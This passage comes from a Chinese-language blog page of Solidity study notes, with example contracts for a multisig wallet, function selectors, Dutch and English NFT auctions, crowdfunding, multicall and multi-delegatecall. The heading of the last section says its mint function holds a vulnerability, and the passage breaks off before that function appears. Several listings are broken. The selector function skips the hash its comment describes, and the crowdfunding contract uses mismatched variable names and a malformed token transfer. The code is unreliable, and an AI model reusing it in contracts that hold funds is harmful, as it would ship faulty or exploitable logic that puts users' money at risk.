i;i&lt;owners.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(approved[_txId][owners[i]]) &#123;</span><br><span class="line">               count+=<span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用于执行最终业务，既交易</span></span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(uint _txId)</span> external <span class="title function_">txExists</span><span class="params">(_txId)</span> <span class="title function_">notExecuted</span><span class="params">(_txId)</span>&#123;</span><br><span class="line">        require(_getApproveCount(_txId)&gt;=required,<span class="string">&quot;approvals &lt; required&quot;</span>);</span><br><span class="line">        Transaction storage transaction=transactions[_txId];</span><br><span class="line"></span><br><span class="line">        transaction.executed=<span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line">        (<span class="type">bool</span> success,)=transaction.to.call&#123;value:transaction.value&#125;(</span><br><span class="line">            transaction.data</span><br><span class="line">        );</span><br><span class="line">        require(success,<span class="string">&quot;tx failed&quot;</span>);</span><br><span class="line">        emit <span class="title function_">Execute</span><span class="params">(_txId)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//批准人在交易前撤销自己原来的批准</span></span><br><span class="line">    function <span class="title function_">revoke</span><span class="params">(uint _txId)</span>external onlyOwner <span class="title function_">txExists</span><span class="params">(_txId)</span> <span class="title function_">notExecuted</span><span class="params">(_txId)</span>&#123;</span><br><span class="line">        require(approved[_txId][msg.sender],<span class="string">&quot;tx not approved&quot;</span>);</span><br><span class="line">        approved[_txId][msg.sender]=<span class="literal">false</span>;</span><br><span class="line">        emit <span class="title function_">Revoke</span><span class="params">(msg.sender,_txId)</span>; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数签名-函数的选择器"><a href="#函数签名-函数的选择器" class="headerlink" title="函数签名(函数的选择器)"></a>函数签名(函数的选择器)</h2><p><strong>EVM通过函数选择器来调用函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract FunctionSelector&#123;<span class="comment">//获取函数选择器</span></span><br><span class="line">    function <span class="title function_">getSelector</span><span class="params">(<span class="built_in">string</span> calldata _func)</span>external pure <span class="title function_">returns</span><span class="params">(bytes4)</span>&#123;</span><br><span class="line">        <span class="comment">//输入的_func为&quot;transfer(address,uint256)&quot;获取oxa9059cbb与下面的一样</span></span><br><span class="line">        <span class="comment">//return bytes4(keccak256(bytes(_func)));</span></span><br><span class="line">        <span class="keyword">return</span> bytes4(bytes(_func));</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Receiver&#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(bytes data)</span>;</span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address _to,uint _amount)</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(msg.data)</span>;</span><br><span class="line">        <span class="comment">//msg.data:为下面三行组成</span></span><br><span class="line">        <span class="comment">//0xa9059cbb   函数的签名（选择器） [将函数的名称和类型打包后哈希然后取前四个字节]</span></span><br><span class="line">        <span class="comment">//0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4  地址参数</span></span><br><span class="line">        <span class="comment">//000000000000000000000000000000000000000000000000000000000000000b   数字残数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="荷兰拍卖"><a href="#荷兰拍卖" class="headerlink" title="荷兰拍卖"></a>荷兰拍卖</h2><p><strong>随着时间流逝，拍卖价格会越来越低，谁先举牌谁拥有拍卖物品</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721&#123;<span class="comment">//这个合约有很多东西</span></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address _from,address _to,uint _nftId)</span>external;</span><br><span class="line">    <span class="comment">//ERC721与ERC20都必须在他们的合约中approve才能使用他们的transferFrom方法</span></span><br><span class="line">&#125;</span><br><span class="line">contract DutchAuction&#123;</span><br><span class="line">    uint private constant DURATION=<span class="number">7</span> days;</span><br><span class="line">    IERC721 public immutable nft;</span><br><span class="line">    uint public immutable nftId;</span><br><span class="line">    address payable public immutable seller;</span><br><span class="line">    uint public immutable startingPrice;</span><br><span class="line">    uint public immutable startAt;</span><br><span class="line">    uint public immutable expiresAt;</span><br><span class="line">    uint public immutable discountRate;</span><br><span class="line">    constructor(uint _startingPrice,uint _discountRate,address _nft,uint _nftId)&#123;</span><br><span class="line">        seller=payable(msg.sender);</span><br><span class="line">        startingPrice=_startingPrice;</span><br><span class="line">        discountRate=_discountRate;<span class="comment">//每秒的折扣率</span></span><br><span class="line">        startAt=block.timestamp;</span><br><span class="line">        expiresAt=block.timestamp+DURATION;</span><br><span class="line">        require(_startingPrice&gt;=_discountRate*DURATION);</span><br><span class="line">        nft=IERC721(_nft);</span><br><span class="line">        nftId=_nftId;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getPrice</span><span class="params">()</span>public view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        uint timeElapsed=block.timestamp-startAt;</span><br><span class="line">        uint discount =discountRate*timeElapsed;</span><br><span class="line">        <span class="keyword">return</span> startingPrice-discount;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">buy</span><span class="params">()</span>external payable&#123;</span><br><span class="line">        require(block.timestamp&lt;expiresAt,<span class="string">&quot;auction expired&quot;</span>);</span><br><span class="line">        uint price= getPrice();</span><br><span class="line">        require(msg.value&gt;=price,<span class="string">&quot;ETH &lt; price&quot;</span>);</span><br><span class="line">        nft.transferFrom(seller,msg.sender,nftId);</span><br><span class="line">        uint refund=msg.value-price;</span><br><span class="line">        <span class="keyword">if</span>(refund&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            payable(msg.sender).transfer(refund);</span><br><span class="line">        &#125;</span><br><span class="line">        selfdestruct(seller);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="英式拍卖"><a href="#英式拍卖" class="headerlink" title="英式拍卖"></a>英式拍卖</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721&#123;</span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address from,address to,uint nftId)</span>external;</span><br><span class="line">&#125;</span><br><span class="line">contract EnglishAuction&#123;</span><br><span class="line">    event <span class="title function_">Bid</span><span class="params">(address indexed sender ,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Withdraw</span><span class="params">(address indexed bidder,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">End</span><span class="params">(address highestBidder,uint amount)</span>;</span><br><span class="line"></span><br><span class="line">    IERC721 public immutable nft;</span><br><span class="line">    uint public immutable nftId;</span><br><span class="line"></span><br><span class="line">    address payable public immutable seller;</span><br><span class="line">    uint32 public endAt;</span><br><span class="line">    <span class="type">bool</span> public started;</span><br><span class="line">    <span class="type">bool</span> public ended;</span><br><span class="line"></span><br><span class="line">    address public highestBidder;</span><br><span class="line">    uint public highestBid;</span><br><span class="line">    mapping(address =&gt;uint)public bids;<span class="comment">//记录失败投标人投入的钱</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(address _nft,uint _nftId,uint _startingBid)&#123;</span><br><span class="line">        nft=IERC721(_nft);</span><br><span class="line">        nftId=_nftId;</span><br><span class="line">        seller=payable(msg.sender);</span><br><span class="line">        highestBid=_startingBid;<span class="comment">//以起初价格来初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">start</span><span class="params">()</span>external&#123;<span class="comment">//开始拍卖</span></span><br><span class="line">        require(msg.sender==seller,<span class="string">&quot;not seller&quot;</span>);</span><br><span class="line">        require(!started,<span class="string">&quot;started&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        started=<span class="literal">true</span>;</span><br><span class="line">        endAt=uint32(block.timestamp+<span class="number">60</span>);<span class="comment">//六十秒结束</span></span><br><span class="line">        nft.transferFrom(seller,address(this),nftId);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bid</span><span class="params">()</span>external payable&#123;<span class="comment">//参加的拍卖者再次竞标</span></span><br><span class="line">        require(started,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        require(msg.value&gt;highestBid,<span class="string">&quot;value &lt; hightest bid&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(highestBidder!=address(<span class="number">0</span>))&#123;</span><br><span class="line">            bids[highestBidder]+=highestBid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        highestBid=msg.value;</span><br><span class="line">        highestBidder=msg.sender;</span><br><span class="line"></span><br><span class="line">        emit <span class="title function_">Bid</span><span class="params">(msg.sender,msg.value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span>external&#123;<span class="comment">//失败的选手可在此提取原来竞拍投入的钱</span></span><br><span class="line">        uint bal=bids[msg.sender];</span><br><span class="line">        bids[msg.sender]=<span class="number">0</span>;</span><br><span class="line">        payable(msg.sender).transfer(bal);</span><br><span class="line">        emit <span class="title function_">Withdraw</span><span class="params">(msg.sender,bal)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">end</span><span class="params">()</span>external&#123;<span class="comment">//结束拍卖，并将nftId转入最高价的人</span></span><br><span class="line">        require(started,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(!ended,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        require(block.timestamp&gt;=endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ended=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(highestBidder!=address(<span class="number">0</span>))&#123;<span class="comment">//如果有人参加</span></span><br><span class="line">            nft.transferFrom(address(this),highestBidder,nftId);</span><br><span class="line">            seller.transfer(highestBid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//没人参加highestBidders的地址为0</span></span><br><span class="line">            nft.transferFrom(address(this),seller,nftId);</span><br><span class="line">        &#125;</span><br><span class="line">        emit <span class="title function_">End</span><span class="params">(highestBidder,highestBid)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="众筹合约"><a href="#众筹合约" class="headerlink" title="众筹合约"></a>众筹合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">contract CrowdFund&#123;</span><br><span class="line">    event <span class="title function_">Launch</span><span class="params">(uint id,address indexed creator,uint goal,uint32 startAt,uint32 endAt)</span>;</span><br><span class="line">    event <span class="title function_">Cancel</span><span class="params">(uint id)</span>;</span><br><span class="line">    event <span class="title function_">Pledge</span><span class="params">(uint indexed id,address indexed caller,uint amount )</span>;</span><br><span class="line">    event <span class="title function_">Unpledge</span><span class="params">(uint indexed id,address indexed caller,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Claim</span><span class="params">(uint id)</span>;</span><br><span class="line">    event <span class="title function_">Refund</span><span class="params">(uint indexed id,address indexed caller,uint amount)</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Campaign</span>&#123;</span></span><br><span class="line">        address creator;</span><br><span class="line">        uint goal;</span><br><span class="line">        uint pledged;</span><br><span class="line">        uint32 startAt;</span><br><span class="line">        uint32 endAt;</span><br><span class="line">        <span class="type">bool</span> claimed;<span class="comment">//false筹款未被领走，true筹款被领走</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    IERC20 public immutable token;</span><br><span class="line">    uint public count;<span class="comment">//多少个筹款活动</span></span><br><span class="line">    mapping(uint =&gt;Campaign) public campaigns;<span class="comment">//每个合约的映射</span></span><br><span class="line">    mapping(uint=&gt;mapping(address=&gt;uint))public pledgeAmount;<span class="comment">//参与人参与第几个合约的数量</span></span><br><span class="line">    </span><br><span class="line">    constructor(address _token)&#123;</span><br><span class="line">        token=IERC20(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">launch</span><span class="params">(uint _goal,uint32 _startAt,uint32 _endAt)</span>external&#123;<span class="comment">//</span></span><br><span class="line">    require(startAt&gt;=block.timestamp,<span class="string">&quot;start at &lt; now&quot;</span>);</span><br><span class="line">    require(_endAt&gt;=_startAt,<span class="string">&quot;end at &lt; start at&quot;</span>);</span><br><span class="line">    require (_endAt&lt;=block.timestamp+<span class="number">90</span> days,<span class="string">&quot;end at &gt;max duration&quot;</span>);</span><br><span class="line">    count+=<span class="number">1</span>;</span><br><span class="line">    campaigns[count]=Campaign(&#123;</span><br><span class="line">        creator:msg.sender,</span><br><span class="line">        goal:_goal,</span><br><span class="line">        pledged:<span class="number">0</span>,</span><br><span class="line">        startAt:_startAt,</span><br><span class="line">        endAt:_endAt,</span><br><span class="line">        claimed:<span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    emit <span class="title function_">Launch</span><span class="params">(count, msg.sender,_goal,_startAt,_endAt)</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">cancel</span><span class="params">(uint _id)</span>external&#123;<span class="comment">//开始前取消众筹</span></span><br><span class="line">        Campaign memory campaign=campaigns[id];</span><br><span class="line">        require(msg.sender==campaign.creator,<span class="string">&quot;not creator&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;campaign.startAt,<span class="string">&quot;started&quot;</span>);</span><br><span class="line">        delete campaigns[id];</span><br><span class="line">        emit <span class="title function_">Cancel</span><span class="params">(_id)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">pledge</span><span class="params">(uint _id,uint _amount)</span>external&#123;<span class="comment">//参与众筹</span></span><br><span class="line">        Campaign storage campaign=campaigns[_id];</span><br><span class="line">        require(block.timestamp&gt;=campaign.startAt,<span class="string">&quot;not started&quot;</span>);</span><br><span class="line">        require(block.timestamp&lt;=campaign.endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">        campaign.pledged+=_amount;</span><br><span class="line">        pledgedAmount[_id][msg.sender]+=_amount;</span><br><span class="line">        token.transferFrom(msg.sender,address(this),_amount);</span><br><span class="line">        emit <span class="title function_">pledge</span><span class="params">(_id,msg.sender,_amount)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">unpledge</span><span class="params">(uint _id,uint _amount)</span>external&#123;<span class="comment">//撤消众筹</span></span><br><span class="line">    Campaign storage campaign=campaigns[_id];</span><br><span class="line">    require(block.timestamp&lt;=campaign.endAt,<span class="string">&quot;ended&quot;</span>);</span><br><span class="line">    require(pledgeAmount[_id][msg.sender]&gt;=_amount);</span><br><span class="line">    campaign.pledged-=_amount;</span><br><span class="line">    pledgeAmount[_id][msg.sender]-=_amount;</span><br><span class="line"></span><br><span class="line">    token.transfer(msg.sender,_amount);</span><br><span class="line">    emit <span class="title function_">Unpledge</span><span class="params">(_id,msg.sender,_amount)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">claim</span><span class="params">(uint _id)</span>external&#123;</span><br><span class="line">        Campaign storage campaign=campaigns[_id];</span><br><span class="line">        require(msg.sender==campaign.creator,<span class="string">&quot;not creator&quot;</span>);</span><br><span class="line">        require(block.timestamp&gt;campaign.endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line">        require(campaign.pledged&gt;=campaign.goal,<span class="string">&quot;pledged&lt;goal&quot;</span>);</span><br><span class="line">        require(!campaign.claimed,<span class="string">&quot;claimed&quot;</span>);</span><br><span class="line">        campaign.claimed=<span class="literal">true</span>;</span><br><span class="line">        token.transferFrom(msg.sender,campaign.pledged);</span><br><span class="line">        emit <span class="title function_">Claim</span><span class="params">(_id)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">refund</span><span class="params">(uint _id)</span>external&#123;<span class="comment">//未达到目标就会失败，用户可以取走自己的钱</span></span><br><span class="line">    Campaign storage campaign=campaigns[_id];</span><br><span class="line">    require(block.timestamp&gt;campaign.endAt,<span class="string">&quot;not ended&quot;</span>);</span><br><span class="line">    require(campaign.pledged&lt;campaign.goal,<span class="string">&quot;pledged&gt;goal&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uint bal=pledgeAmount[_id][msg.sender];</span><br><span class="line">    pledgeAmount[_id][msg.sender]=<span class="number">0</span>;</span><br><span class="line">    token.transfer(msg.sender,bal);</span><br><span class="line">    emit <span class="title function_">Refund</span><span class="params">(_id,msg.sender,bal)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Multi-call多重调用"><a href="#Multi-call多重调用" class="headerlink" title="Multi call多重调用"></a>Multi call多重调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract TestMultiCall&#123;</span><br><span class="line">  function <span class="title function_">func1</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint,uint)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>,block.timestamp);</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">func2</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint,uint)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">2</span>,block.timestamp);</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">getData1</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func1()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(this.func1.selector);</span><br><span class="line">  &#125;</span><br><span class="line">   function <span class="title function_">getData2</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func2()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(this.func2.selector);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">contract MultiCall&#123;</span><br><span class="line">  function <span class="title function_">fun</span><span class="params">(address addr)</span>external <span class="title function_">returns</span><span class="params">( uint,uint)</span>&#123;</span><br><span class="line">    (uint x,uint y)=TestMultiCall(addr).func1();</span><br><span class="line">    (uint z,uint t)=TestMultiCall(addr).func2();</span><br><span class="line">    <span class="keyword">return</span> (y,t);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过data调用</span></span><br><span class="line">contract MultiCall2&#123;</span><br><span class="line">  function <span class="title function_">multicall</span><span class="params">(address[]calldata targets,bytes[]memory data)</span></span><br><span class="line">    external view <span class="title function_">returns</span><span class="params">(bytes[] memory)</span></span><br><span class="line">  &#123;</span><br><span class="line">    require(targets.length==data.length,<span class="string">&quot;target!=data&quot;</span>);</span><br><span class="line">    bytes[]memory results=new bytes[](data.length);</span><br><span class="line">    <span class="keyword">for</span>(uint i;i&lt;targets.length;i++)&#123;</span><br><span class="line">      (<span class="type">bool</span> success,bytes memory result)=targets[i].staticcall(data[i]);<span class="comment">//静态调用，因为有view</span></span><br><span class="line">      require(success,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">      results[i]=result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">    <span class="comment">//返回的data是bytes类型的，需要解码。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多重委托调用-mint处内涵漏洞！！！"><a href="#多重委托调用-mint处内涵漏洞！！！" class="headerlink" title="多重委托调用(mint处内涵漏洞！！！)"></a>多重委托调用(mint处内涵漏洞！！！)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract Helper&#123;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">getData1</span><span class="params">(uint x,uint y)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func1()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(TestMultiDelegatecall.func1.selector,x,y);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   function <span class="title function_">getData2</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="comment">//abi.encodeWithSignature(&quot;func2()&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(TestMultiDelegatecall.func2.selector);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">getMintData</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> abi.encodeWithSelector(TestMultiDelegatecall.mint.selector);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MultiDelegatecall&#123;</span><br><span class="line">  function <span class="title function_">multicallDelegatecall</span><span class="params">(bytes[]memory data)</span></span><br><span class="line">    external payable <span class="title function_">returns</span><span class="params">(bytes[] memory)</span></span><br><span class="line">  &#123;</span><br><span class="line">     bytes[]memory results=new bytes[](data.length);</span><br><span class="line">    <span class="keyword">for</span>(uint i;i&lt;data.length;i++)&#123;</span><br><span class="line">      (<span class="type">bool</span> ok,bytes memory result)=address(this).delegatecall(data[i]);</span><br><span class="line">      require(ok,<span class="string">&quot;call failed&quot;</span>);</span><br><span class="line">      results[i]=result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract TestMultiDelegatecall is MultiDelegatecall&#123;</span><br><span class="line">  